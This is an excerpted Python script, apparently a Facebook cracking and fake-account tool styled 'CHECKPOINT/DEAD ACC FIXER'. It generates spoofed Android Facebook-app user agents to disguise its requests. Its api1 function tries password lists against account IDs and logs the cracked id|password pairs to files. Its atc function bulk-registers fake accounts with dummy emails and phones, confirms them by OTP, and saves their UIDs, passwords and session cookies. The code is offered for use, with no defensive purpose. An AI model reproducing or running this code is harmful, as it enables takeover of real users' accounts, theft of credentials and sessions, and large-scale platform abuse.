...
def Samsung():
    ...
    models = list(set([
        ...
        'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN',
        'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'
    ]))
    facebook_apps = [
    ...
    build_versions = ['LRX22C', 'MMB29M', 'NRD90M', 'QKQ1.191222.002']
    carriers = ['Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Vodafone', 'S COMVIQ', 'Orange']
    Anderson = random.choice(android_versions)
    model = random.choice(models)
    build = random.choice(build_versions)
    carrier = random.choice(carriers)
    vir = str(random.randint(111111111, 999999999))
    cho = str(random.randint(43, 447))
    fb = random.choice(facebook_apps)
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    ua = (
        f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/{build}) '
        f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};'
        f'FBCR/{carrier};FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/{Anderson};'
        f'FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.randint(1, 3)}.0,'
        f'width={random.randint(720, 1500)},height={random.randint(1500, 2000)}}};FB_FW/1;]'
    )    
    return ua
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ USERAGENT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
ua = UserAgent()
...
░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝
░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
""",title="[bold yellow]CHECKPOINT/DEAD ACC FIXER [bold cyan]V[bold red][u]7[/u]",subtitle=f"[bold green]SIM : {ahydra}",border_style=f"{border_color()}"))
def hx():
	print(Panel(fr"""{color()}DEVELOPER    : SYTHE
FACEBOOK    : Yush Heilen
TODAY DATE  : [{hari},{tanggal}|{waktu}]""",border_style=f"{border_color()}"))
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CLEAR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def clear():
...
def api1(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            network = random.choice(['TM','GLOBE','SMART','TNT'])
            ...
            if "session_key" in po:
                ...
                open('/sdcard/SEX/SEX-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        statuscp1 = Panel(statuscp,style='bold red')
                                        print(Panel(statuscp1,title='SEX CP'))
                                        open('/sdcard/SEX/SEX-RND-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def other():
	clear()
	print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] AUTOMATIC FB TYPE CREATION",border_style=f"{border_color()}"))
	bryyy=input(f'\033[1;36mChoose Number: \033[1;33m')
	if bryyy in ['1','01']:
		atc()
	else:
...
def progres(current,num_accounts,delay):
		for sleep in range(int(delay), 0, -1):
			sys.stdout.write('\r\033[1;37m[SEX-CREATE]-\033[1;37m[\033[1;36m%s\033[1;37m/\033[1;31m%s\033[1;37m]-\033[1;37m[\033[1;32mOK:-%s\033[1;37m]-[\033[1;31mCP:-%s\033[1;37m] \033[1;37m'%(current,num_accounts,len(oks),len(cps)));sys.stdout.flush()
			time.sleep(1)
			if current == num_accounts:
				break

def atc() -> None:
    global oks,cps,passw,num_accounts,delay
    num_accounts = int(input("\033[1;37mHOW MANY ACC : "))
    delay = int(input("\033[1;37mDELAY TIME BETWEEN REQUESTS : "))
    clear()
    print(Panel("[bold yellow][[bold cyan]1[bold yellow]][bold green] DEFAULT PASSWORD\n[bold yellow][[bold cyan]2[bold yellow]][bold green] CUSTOM PASSWORD",border_style=f"{border_color()}"))
    bryyy=input(f'\033[1;36mChoose Number: \033[1;33m')
    if bryyy in ["1","01"]:
    	passw=fake_password()
    elif bryyy in ["2","02"]:
    ...
    for make in range(int(num_accounts)):
        ...
        print()
        print(Panel(f"[bold white] ACCESSING FACEBOOK",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] REGISTERING ACCOUNT",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] FILLING UP CREDENTIALS",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] CHECKING ACCOUNT LIVE OR NOT",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] GETTING MAIL & GETTING PHONE",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] DUMMYPHONE : [bold green1]{phone2}",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] DUMMYEMAIL : [bold green1]{email3}",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] EMAIL : [bold green1]{email2}",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] FIRSTNAME : {firstname}",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] LASTNAME : {lastname}",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] PASSWORD : {passw}",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] FILLING CREDENTIALS [bold green1]DONE  ",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold green1] ACCOUNT LIVE",border_style=f"{border_color()}"))
        dn()
        print(Panel(f"[bold white] DATE & TIME : [bold green1]{tanggal} {waktu}",border_style=f"{border_color()}"))
        dn()
        payload = {
            'ccp': "2",
        ...
        if "c_user" in py_submit.cookies:
            ...
            if valid:
                print(Panel(f"[bold white] OTP SENT TO MAIL",border_style=f"{border_color()}"))
                print(Panel(f"[bold white] VERIFICATION CODE : {valid}",border_style=f"{border_color()}"))
                confirm_id(email2,uid,valid,con_sub,ses)
            else:
                #print(Panel(f"[bold red] DISABLED ID",border_style=f"{border_color()}"))
                cps.append(uid)
        else:
            #print(Panel(f" [bold red]SUCCESSFULLY CHECKPOINT ID",border_style=f"{border_color()}"))
            cps.append(uid)
...
def confirm_id(mail,uid,otp,data,ses):
    try:
        ...
        if "checkpoint" in str(response.url):
            print(Panel(f"[bold red] FUCKED ID DISABLED",border_style=f"{border_color()}"))
        else:
            cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
            print(Panel(f"[bold green] UID      : {uid}\n[bold green] PASSWORD : {passw}\n[bold green] COOKIE   : [bold green1]{cookie}",subtitle="[bold yellow] CREATE ",border_style=f"{border_color()}"))
            dn()
            open("/sdcard/SEX/SEX-OK-ID.txt","a").write(uid+f"|{passw}|"+cookie+"\n")
            oks.append(uid)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ END ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
